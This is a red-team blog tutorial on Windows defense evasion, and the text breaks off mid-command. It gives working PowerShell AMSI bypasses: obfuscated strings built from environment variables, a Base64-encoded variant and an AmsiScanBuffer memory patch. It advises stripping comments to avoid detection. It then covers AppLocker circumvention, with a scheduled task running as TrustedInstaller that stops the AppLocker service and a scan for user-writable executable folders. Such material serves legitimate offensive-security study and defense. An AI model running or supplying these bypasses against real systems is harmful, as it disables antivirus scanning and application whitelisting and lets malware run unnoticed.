<p>So I decided to write a PowerShell script That retrieves all environment variables to search for every word that I entered to get it immediately as a variable you can use it from my GitHub repo from <a target="_blank" rel="noopener" href="https://github.com/N1NJ10/Bad_Scripts/blob/main/PowerShell/Envrandomizer.ps1">here</a></p>
<blockquote>
<p>The idea behinde this sript come to me after seeing <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=-j7zzUwB_-E&t=414s">Daniel Bohannon</a> explaining Invoke-CradleCrafter</p>
</blockquote>
<p>With this script, i can craft our payload in a new way</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line"># Extract characters from system environment variables to form &quot;system&quot;</span><br><span class="line">$s1 = [Environment]::GetEnvironmentVariable(&#x27;DriverData&#x27;)[11]  # &#x27;S&#x27;</span><br><span class="line">$s2 = [Environment]::GetEnvironmentVariable(&quot;COMSPEC&quot;)[12]  # &#x27;y&#x27;</span><br><span class="line">$s3 = [Environment]::GetEnvironmentVariable(&quot;ComSpec&quot;)[9] # &#x27;s&#x27;</span><br><span class="line">$s4 = [Environment]::GetEnvironmentVariable(&#x27;ALLUSERSPROFILE&#x27;)[12] # &#x27;t&#x27;</span><br><span class="line">$s5 = [Environment]::GetEnvironmentVariable(&quot;HOMEPATH&quot;)[3]  # &#x27;e&#x27;</span><br><span class="line">$s6 = [Environment]::GetEnvironmentVariable(&quot;ALLUSERSPROFILE&quot;)[9]  # &#x27;m&#x27;</span><br><span class="line"></span><br><span class="line">$s = &quot;$s1$s2$s3$s4$s5$s6&quot; # &quot;System&quot;</span><br><span class="line"></span><br><span class="line"># Extract characters from system environment variables to form &quot;Management&quot;</span><br><span class="line">$m1 = [Environment]::GetEnvironmentVariable(&quot;PSModulePath&quot;)[137]  # &#x27;M&#x27;</span><br><span class="line">$m2 = [Environment]::GetEnvironmentVariable(&quot;ALLUSERSPROFILE&quot;)[8]  # &#x27;a&#x27;</span><br><span class="line">$m3 = [Environment]::GetEnvironmentVariable(&quot;CommonProgramFiles&quot;)[22]  # &#x27;n&#x27;</span><br><span class="line">$m4 = [Environment]::GetEnvironmentVariable(&quot;ALLUSERSPROFILE&quot;)[8]  # &#x27;a&#x27;</span><br><span class="line">$m5 = [Environment]::GetEnvironmentVariable(&quot;ProgramFiles(x86)&quot;)[6]  # &#x27;g&#x27;</span><br><span class="line">$m6 = [Environment]::GetEnvironmentVariable(&quot;HOMEPATH&quot;)[3]  # &#x27;e&#x27;</span><br><span class="line">$m7 = [Environment]::GetEnvironmentVariable(&#x27;ALLUSERSPROFILE&#x27;)[9]  # &#x27;M&#x27;</span><br><span class="line">$m8 = [Environment]::GetEnvironmentVariable(&quot;HOMEPATH&quot;)[3]  # &#x27;e&#x27;</span><br><span class="line">$m9 = [Environment]::GetEnvironmentVariable(&quot;CommonProgramFiles&quot;)[22] # &#x27;n&#x27;</span><br><span class="line">$mx = [Environment]::GetEnvironmentVariable(&#x27;ALLUSERSPROFILE&#x27;)[12] # &#x27;t&#x27;</span><br><span class="line"></span><br><span class="line">$m = &quot;$m1$m2$m3$m4$m5$m6$m7$m8$m9$mx&quot; # &quot;Management&quot;</span><br><span class="line"></span><br><span class="line"># Extract characters from system environment variables to form &quot;Automation&quot;</span><br><span class="line">$a1 = [Environment]::GetEnvironmentVariable(&#x27;APPDATA&#x27;)[15]  # &#x27;A&#x27;</span><br><span class="line">$a2 = [Environment]::GetEnvironmentVariable(&#x27;FPS_BROWSER_USER_PROFILE_STRING&#x27;)[4]  # &#x27;u&#x27;</span><br><span class="line">$a3 = [Environment]::GetEnvironmentVariable(&#x27;ALLUSERSPROFILE&#x27;)[12]  # &#x27;t&#x27;</span><br><span class="line">$a4 = [Environment]::GetEnvironmentVariable(&quot;windir&quot;)[7]  # &#x27;o&#x27;</span><br><span class="line">$a5 = [Environment]::GetEnvironmentVariable(&quot;ALLUSERSPROFILE&quot;)[9]  # &#x27;m&#x27;</span><br><span class="line">$a6 = [Environment]::GetEnvironmentVariable(&quot;ALLUSERSPROFILE&quot;)[8]  # &#x27;a&#x27;</span><br><span class="line">$a7 = [Environment]::GetEnvironmentVariable(&#x27;ALLUSERSPROFILE&#x27;)[12]  # &#x27;t&#x27;</span><br><span class="line">$a8 = [Environment]::GetEnvironmentVariable(&quot;CommonProgramFiles&quot;)[12]  # &#x27;i&#x27;</span><br><span class="line">$a9 = [Environment]::GetEnvironmentVariable(&quot;windir&quot;)[7]  # &#x27;o&#x27;</span><br><span class="line">$ax = [Environment]::GetEnvironmentVariable(&quot;CommonProgramFiles&quot;)[22]  # &#x27;n&#x27;</span><br><span class="line">$a = &quot;$a1$a2$a3$a4$a5$a6$a7$a8$a9$ax&quot;  # &quot;Automation&quot;</span><br><span class="line"></span><br><span class="line"># Extract characters from system environment variables to form &quot;Amsi&quot;</span><br><span class="line">$am0 =  [Environment]::GetEnvironmentVariable(&quot;TEMP&quot;)[4] + [Environment]::GetEnvironmentVariable(&quot;PUBLIC&quot;)[13] # &#x27;si&#x27;</span><br><span class="line">$am1 = [Environment]::GetEnvironmentVariable(&#x27;APPDATA&#x27;)[15]  # &#x27;A&#x27;</span><br><span class="line">$am2 = [Environment]::GetEnvironmentVariable(&quot;TEMP&quot;)[9]  # &#x27;m&#x27;</span><br><span class="line">$am3 = [Environment]::GetEnvironmentVariable(&quot;TEMP&quot;)[4]  # &#x27;s&#x27;</span><br><span class="line">$am4  = [Environment]::GetEnvironmentVariable(&quot;PUBLIC&quot;)[13]  # &#x27;i&#x27;</span><br><span class="line">$am = &quot;$am1$am2$am3$am4&quot;  # &quot;Amsi&quot;</span><br><span class="line"></span><br><span class="line"># Extract characters from system environment variables to form &quot;Utils&quot;</span><br><span class="line">$u1 = [Environment]::GetEnvironmentVariable(&quot;PSModulePath&quot;)[3]  # &#x27;U&#x27;</span><br><span class="line">$u2 = [Environment]::GetEnvironmentVariable(&#x27;ALLUSERSPROFILE&#x27;)[12]  # &#x27;t&#x27;</span><br><span class="line">$u3 = [Environment]::GetEnvironmentVariable(&quot;PUBLIC&quot;)[13]  # &#x27;i&#x27;</span><br><span class="line">$u4 = [Environment]::GetEnvironmentVariable(&quot;PSModulePath&quot;)[40]  # &#x27;l&#x27;</span><br><span class="line">$u5 = [Environment]::GetEnvironmentVariable(&quot;PSModulePath&quot;)[49]  # &#x27;s&#x27;</span><br><span class="line">$u = &quot;$u1$u2$u3$u4$u5&quot;  # &quot;Utils&quot;</span><br><span class="line"></span><br><span class="line"># Construct the type name for AMSI Utils</span><br><span class="line">$typeName = &quot;$s.$m.$a.$am$u&quot;  # &quot;System.Management.Automation.AmsiUtils&quot;</span><br><span class="line"></span><br><span class="line"># Get the AMSI Utils type</span><br><span class="line">$assembly = [Ref].Assembly.GetType($typeName)</span><br><span class="line"></span><br><span class="line"># Get the &#x27;amsiInitFailed&#x27; field</span><br><span class="line"></span><br><span class="line">$field = $assembly.GetField((&#x27;am&#123;0&#125;InitFailed&#x27; -f $am0), &#x27;NonPublic,Static&#x27;)</span><br><span class="line"></span><br><span class="line"># Set the &#x27;amsiInitFailed&#x27; field to true</span><br><span class="line">$field.SetValue($null, $true)</span><br></pre></td></tr></table></figure></figure>

<p>That’s nice let’s try it</p>
<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def9.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>

<blockquote>
<p><strong>Remove the comments</strong> to avoid detecting i just put them for u to understand what I do<br>{: .prompt-tip }</p>
</blockquote>
<p>Bypassed ! , Yeah we did it together mate be creative in ur thoughts and u will see magic , Let’s see other methods</p>
<blockquote>
<p>Bypassing AMSI does not necessarily bypass all antivirus protections. Modern antivirus solutions employ multiple layers of defense, including behavioral analysis and heuristics, which can still detect and block malicious activities even if AMSI is bypassed.<br>{: .prompt-info }</p>
</blockquote>
<h4 id="Base64-Encoding"><a href="#Base64-Encoding" class="headerlink" title="Base64 Encoding"></a>Base64 Encoding</h4><p>Of course, encoding will get into the game, Let’s see how to use it</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="variable">$command</span> = <span class="string">&#x27;hostname&#x27;</span></span><br><span class="line"><span class="variable">$bytes</span> = [<span class="type">System.Text.Encoding</span>]::Unicode.GetBytes(<span class="variable">$command</span>)</span><br><span class="line"><span class="variable">$encodedCommand</span> = [<span class="type">Convert</span>]::ToBase64String(<span class="variable">$bytes</span>)</span><br><span class="line"><span class="built_in">Write-Output</span> <span class="variable">$encodedCommand</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$decodedBytes</span> = [<span class="type">Convert</span>]::FromBase64String(<span class="variable">$encodedCommand</span>)</span><br><span class="line"><span class="variable">$decodedCommand</span> = [<span class="type">System.Text.Encoding</span>]::Unicode.GetString(<span class="variable">$decodedBytes</span>)</span><br><span class="line"><span class="built_in">Invoke-Expression</span> <span class="variable">$decodedCommand</span></span><br></pre></td></tr></table></figure></figure>

<p>This example takes a command [ hostname ] and encodes it to base64 then decodes and execute it this is the same method that we will be using</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/3538021/why-do-we-use-base64">Why do we use bytes no encode and decode directly ?</a></p>
<p>This is necessary because Base64 operates on byte data. Strings are sequences of characters, which must be converted to bytes for Base64 encoding.<br>{: .prompt-info }</p>
</blockquote>
<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def10.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>


<p>Let’s see how to use it in our script</p>
<p>from</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ReF</span>=[<span class="type">ReF</span>].AsSemBlY.GEtTypE(<span class="string">&#x27;System.Management.Automation.AmsiUtils&#x27;</span>);</span><br><span class="line"><span class="variable">$Ref</span>.GetFIElD(<span class="string">&#x27;amsiInitFailed&#x27;</span>,<span class="string">&#x27;NonPublic,Static&#x27;</span>).SETValue(<span class="variable">$NULl</span>,<span class="variable">$truE</span>);</span><br></pre></td></tr></table></figure></figure>

<p><a target="_blank" rel="noopener" href="https://cheatsheet.haax.fr/windows-systems/privilege-escalation/amsi_and_evasion/">To</a></p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line">[<span class="type">Ref</span>].Assembly.GetType(<span class="string">&#x27;System.Management.Automation.&#x27;</span>+<span class="variable">$</span>([<span class="type">Text.Encoding</span>]::Unicode.GetString([<span class="type">Convert</span>]::FromBase64String(<span class="string">&#x27;QQBtAHMAaQBVAHQAaQBsAHMA&#x27;</span>)))).GetField(<span class="variable">$</span>([<span class="type">Text.Encoding</span>]::Unicode.GetString([<span class="type">Convert</span>]::FromBase64String(<span class="string">&#x27;YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA==&#x27;</span>))),<span class="string">&#x27;NonPublic,Static&#x27;</span>).SetValue(<span class="variable">$null</span>,<span class="variable">$true</span>)</span><br></pre></td></tr></table></figure></figure>

<p>Let’s see if this work</p>
<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def11.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>

<p>Again we bypassed the AMSI with the Base64-encoded payload</p>
<p>There is many obfuscation methods left , I will leave u some resources at the end of the post to check them out and try to make one of them work with u consider it as a task</p>
<h3 id="Memory-Patch"><a href="#Memory-Patch" class="headerlink" title="Memory Patch"></a>Memory Patch</h3><p>The idea behind this bypass is to force <span style="color:yellow">AmsiScanBuffer to return AMSI_RESULT_CLEAN</span>. The general idea is to import API calls and then return a specific value to the AmsiScanBuffer() call: 0x80070057. The original bypass is detected by AMSI now, so we can manipulate with assembly instructions by using a double add operand and successfully bypass the control. The code for this is as follows:</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="variable">$Win32</span> = <span class="string">@&quot;</span></span><br><span class="line"><span class="string">using System;</span></span><br><span class="line"><span class="string">using System.Runtime.InteropServices;</span></span><br><span class="line"><span class="string">public class Win32 &#123;</span></span><br><span class="line"><span class="string">    [DllImport(&quot;kernel32&quot;)]</span></span><br><span class="line"><span class="string">    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);</span></span><br><span class="line"><span class="string">    [DllImport(&quot;kernel32&quot;)]</span></span><br><span class="line"><span class="string">    public static extern IntPtr LoadLibrary(string name);</span></span><br><span class="line"><span class="string">    [DllImport(&quot;kernel32&quot;)]</span></span><br><span class="line"><span class="string">    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;@</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Add-Type</span> <span class="variable">$Win32</span></span><br><span class="line"><span class="variable">$test</span> = [<span class="built_in">Byte</span>[]](<span class="number">0</span>x61, <span class="number">0</span>x6d, <span class="number">0</span>x73, <span class="number">0</span>x69, <span class="number">0</span>x2e, <span class="number">0</span>x64, <span class="number">0</span>x6c, <span class="number">0</span>x6c)</span><br><span class="line"><span class="variable">$LoadLibrary</span> = [<span class="type">Win32</span>]::LoadLibrary([<span class="type">System.Text.Encoding</span>]::ASCII.GetString(<span class="variable">$test</span>))</span><br><span class="line"><span class="variable">$test2</span> = [<span class="built_in">Byte</span>[]] (<span class="number">0</span>x41, <span class="number">0</span>x6d, <span class="number">0</span>x73, <span class="number">0</span>x69, <span class="number">0</span>x53, <span class="number">0</span>x63, <span class="number">0</span>x61, <span class="number">0</span>x6e, <span class="number">0</span>x42, <span class="number">0</span>x75, <span class="number">0</span>x66, <span class="number">0</span>x66, <span class="number">0</span>x65, <span class="number">0</span>x72)</span><br><span class="line"><span class="variable">$Address</span> = [<span class="type">Win32</span>]::GetProcAddress(<span class="variable">$LoadLibrary</span>, [<span class="type">System.Text.Encoding</span>]::ASCII.GetString(<span class="variable">$test2</span>))</span><br><span class="line"><span class="variable">$p</span> = <span class="number">0</span></span><br><span class="line">[<span class="type">Win32</span>]::VirtualProtect(<span class="variable">$Address</span>, [<span class="type">uint32</span>]<span class="number">5</span>, <span class="number">0</span>x40, [<span class="type">ref</span>]<span class="variable">$p</span>)</span><br><span class="line"><span class="variable">$Patch</span> = [<span class="built_in">Byte</span>[]] (<span class="number">0</span>x31, <span class="number">0</span>xC0, <span class="number">0</span>x05, <span class="number">0</span>x78, <span class="number">0</span>x01, <span class="number">0</span>x19, <span class="number">0</span>x7F, <span class="number">0</span>x05, <span class="number">0</span>xDF, <span class="number">0</span>xFE, <span class="number">0</span>xED, <span class="number">0</span>x00, <span class="number">0</span>xC3)</span><br><span class="line"><span class="comment">#0:  31 c0                   xor    eax,eax</span></span><br><span class="line"><span class="comment">#2:  05 78 01 19 7f          add    eax,0x7f190178</span></span><br><span class="line"><span class="comment">#7:  05 df fe ed 00          add    eax,0xedfedf</span></span><br><span class="line"><span class="comment">#c:  c3                      ret </span></span><br><span class="line">[<span class="type">System.Runtime.InteropServices.Marshal</span>]::<span class="built_in">Copy</span>(<span class="variable">$Patch</span>, <span class="number">0</span>, <span class="variable">$Address</span>, <span class="variable">$Patch</span>.Length)</span><br></pre></td></tr></table></figure></figure>

<p>Let’s try it</p>
<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def12.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>

<p>Again we bypassed the AMSI</p>
<blockquote>
<p>If u wanna deep dive into this u can write this <a target="_blank" rel="noopener" href="https://medium.com/@sam.rothlisberger/amsi-bypass-memory-patch-technique-in-2024-f5560022752b">writeup</a><br>{: .prompt-tip }</p>
</blockquote>
<h2 id="AppLocker-and-Powershell-CLM"><a href="#AppLocker-and-Powershell-CLM" class="headerlink" title="AppLocker and Powershell CLM"></a>AppLocker and Powershell CLM</h2><p>Applocker is a white-listing solution With this feature, you can limit not only applications, but also scripts, batches, DLLs, and more. There are a few ways that a limit can be applied: <strong>by Name, Path, Publisher, or Hash</strong> , you can use rules to enforce it to Allow and deny as I will show you</p>
<p>PowerShell Constrained Language Mode [ CLM ] is a <a target="_blank" rel="noopener" href="https://devblogs.microsoft.com/powershell/a-comparison-of-shell-and-scripting-language-security/">language mode</a> of PowerShell designed to support day-to-day administrative tasks, yet restrict access to sensitive language elements that can be used to invoke arbitrary Windows APIs , So why this for ?</p>
<p>Because it’s an incredibly effective way to drastically reduce the risk of viruses, ransomware, and unapproved software. For DeviceGuard UMCI the approved applications are determined via a UMCI policy. PowerShell automatically detects when a UMCI policy is being enforced on a system and will run only in Constrained Language mode. So PowerShell Constrained Language mode becomes more interesting when working in conjunction with system-wide lockdown policies.</p>
<blockquote>
<p>Local Account Syntax: The general syntax for logging in with a local account is <code>.\username</code><br>{: .prompt-tip }</p>
</blockquote>
<p>Now we know what is Applocker &amp; PowerShell Constrained Language Mode let’s see how to use them, I need you to follow this <a target="_blank" rel="noopener" href="https://www.hackingarticles.in/windows-applocker-policy-a-beginners-guide/">guide</a></p>
<p>Let’s setup our enviroment :</p>
<p>First we need to configure the Applocker policy from LocalGroupPolicy -&gt; Computer Configration -&gt; Windows Settings -&gt; Security Settings -&gt; Application Control Policies -&gt; AppLocker</p>
<p>Then i need you to follow the pervious blog and create 2 rules :</p>
<ul>
<li>Rule Path to run only executables from the C:\Windows*</li>
<li>block the <a target="_blank" rel="noopener" href="https://github.com/int0x33/nc.exe/blob/master/nc64.exe">nc64.exe</a> by the hash</li>
</ul>
<p>Then generate the default creds for the Script Rules to apply the Constrained Language Mode</p>
<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def13.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>


<p>If you follow the rules you should see something like this !</p>
<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def15.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>

<blockquote>
<p>This is from <a target="_blank" rel="noopener" href="https://patchmypc.com/blog/windows-11-24h2-applocker-powershell-constrained-language-broken/">Rudy Ooms</a> :</p>
<p>But How PowerShell Determines Language Mode Based on AppLocker Script Rules ??</p>
<p>When PowerShell starts, it checks whether <a target="_blank" rel="noopener" href="https://call4cloud.nl/deploying-applocker-intune-powershell/">AppLocker Script Enforcement</a> Rules are present. It does this by simulating the execution of a test PowerShell script placed in the user’s temporary folder and evaluating it against the system’s policies. As shown below, the DLL (System.Management.Automation.dll) responsible for PowerShell shows this behavior.</p>
<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def16.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>
This means that if AppLocker’s rules block or restrict the test PS1 file, PowerShell automatically switches into Constrained Language Mode.
<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def17.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>
If no restrictions apply, PowerShell Scripts will be executed in full language mode. This automatic detection has worked reliably for years and has been a simple way to enforce script safety without needing extra configuration inside PowerShell itself.<p>{: .prompt-tip }</p>
</blockquote>
<p>But is this a good security approach , It depends on the quality of the rules we are implementing</p>
<p>Can you disable the Applocker ? ( <strong>Matio here is an administrator</strong> )</p>
<p>For the first look you can say yes if we are an administrators but seems it doesn’t work like this</p>
<p>Let’s first talk about the PPL (Protected Process Light) : The PLL is a security feature in Windows that protects critical system processes like antivirus engines, security services, and system integrity components from being <strong>tampered with</strong>, even by <strong>administrators or SYSTEM-level accounts</strong>.</p>
<p>So Let’s try to disable the AppLocker</p>
<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def18.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>

<p>Even with the System account</p>
<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def19.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>

<blockquote>
<p>By the way  <a target="_blank" rel="noopener" href="https://www.tiraniddo.dev/2019/11/the-internals-of-applocker-part-1.html">tiraniddo</a> here found a way to disable the AppLocker with the TrustedInstaller account :</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="built_in">New-ScheduledTaskAction</span> <span class="literal">-Execute</span> cmd.exe <span class="literal">-Argument</span> <span class="string">&quot;/C sc.exe config appidsvc start= demand &amp;&amp; sc.exe stop appidsvc&quot;</span></span><br><span class="line"><span class="built_in">Register-ScheduledTask</span> <span class="literal">-TaskName</span> <span class="string">&#x27;TestTask&#x27;</span> <span class="literal">-TaskPath</span> \ <span class="literal">-Action</span> <span class="variable">$a</span></span><br><span class="line"><span class="variable">$svc</span> = <span class="built_in">New-Object</span> <span class="literal">-ComObject</span> <span class="string">&#x27;Schedule.Service&#x27;</span></span><br><span class="line"><span class="variable">$svc</span>.Connect()</span><br><span class="line"><span class="variable">$user</span> = <span class="string">&#x27;NT SERVICE\TrustedInstaller&#x27;</span></span><br><span class="line"><span class="variable">$folder</span> = <span class="variable">$svc</span>.GetFolder(<span class="string">&#x27;\&#x27;</span>)</span><br><span class="line"><span class="variable">$task</span> = <span class="variable">$folder</span>.GetTask(<span class="string">&#x27;TestTask&#x27;</span>)</span><br><span class="line"><span class="variable">$task</span>.RunEx(<span class="variable">$null</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="variable">$user</span>)</span><br></pre></td></tr></table></figure></figure><p>{: .prompt-tip }</p>
</blockquote>
<h3 id="Path-Hash-restrictions-bypass"><a href="#Path-Hash-restrictions-bypass" class="headerlink" title="Path &#x2F; Hash restrictions bypass"></a>Path &#x2F; Hash restrictions bypass</h3><p>In this scenario, i will show you how we can bypass the Path &#x2F; Hash restrictions by moving the file to an allowed executable path and changing the file wish to lead to changing the whole hash</p>
<p>First we will see what directories that our permession to the subdirectories of the main dir that we can run exe files from it</p>
<p>Then we will edit the file hash , Seems this will make will work</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\matio&gt; <span class="built_in">Get-ChildItem</span> C:\Windows\ <span class="literal">-Directory</span> <span class="literal">-Recurse</span> <span class="literal">-ErrorAction</span> SilentlyContinue | <span class="built_in">ForEach-Object</span> &#123; <span class="variable">$dir</span> = <span class="variable">$_</span>; <span class="keyword">try</span> &#123; (<span class="built_in">Get-Acl</span> <span class="variable">$dir</span>.FullName <span class="literal">-ErrorAction</span> SilentlyContinue).Access | <span class="built_in">Where-Object</span> &#123; <span class="variable">$_</span>.AccessControlType <span class="operator">-eq</span> <span class="string">&quot;Allow&quot;</span> <span class="operator">-and</span> (<span class="variable">$_</span>.IdentityReference.Value <span class="operator">-eq</span> <span class="string">&quot;NT AUTHORITY\Authenticated Users&quot;</span> <span class="operator">-or</span> <span class="variable">$_</span>.IdentityReference.Value <span class="operator">-eq</span> <span class="string">&quot;BUILTIN\Users&quot;</span>) <span class="operator">-and</span> ((<span class="variable">$_</span>.FileSystemRights <span class="operator">-like</span> <span class="string">&quot;*Write*&quot;</span> <span class="operator">-or</span> <span class="variable">$_</span>.FileSystemRights <span class="operator">-like</span> <span class="string">&quot;*Create*&quot;</span>) <span class="operator">-and</span> <span class="variable">$_</span>.FileSystemRights <span class="operator">-like</span> <span class="string">&quot;*Execute*&quot;</span>) &#125; | <span class="built_in">ForEach-Object</span> &#123; <span class="built_in">Write-Host</span> (<span class="variable">$dir</span>.FullName + <span class="string">&quot;: &quot;</span> + <span class="variable">$_</span>.IdentityReference.Value + <span class="string">&quot; (&quot;</span> + <span class="variable">$_</span>.FileSystemRights + <span class="string">&quot;)&quot;</span>) &#125; &#125; <span class="keyword">catch</span> &#123;&#125; &#125;</span><br><span class="line">C:\Windows\Tasks: NT AUTHORITY\Authenticated Users (CreateFiles, ReadAndExecute, Synchronize)</span><br><span class="line">C:\Windows\tracing: BUILTIN\Users (<span class="built_in">Write</span>, ReadAndExecute, Synchronize)</span><br><span class="line">C:\Windows\System32\spool\drivers\color: BUILTIN\Users (CreateFiles, ReadAndExecute, Synchronize)</span><br><span class="line"><span class="built_in">PS</span> C:\Users\matio&gt; <span class="built_in">cp</span> 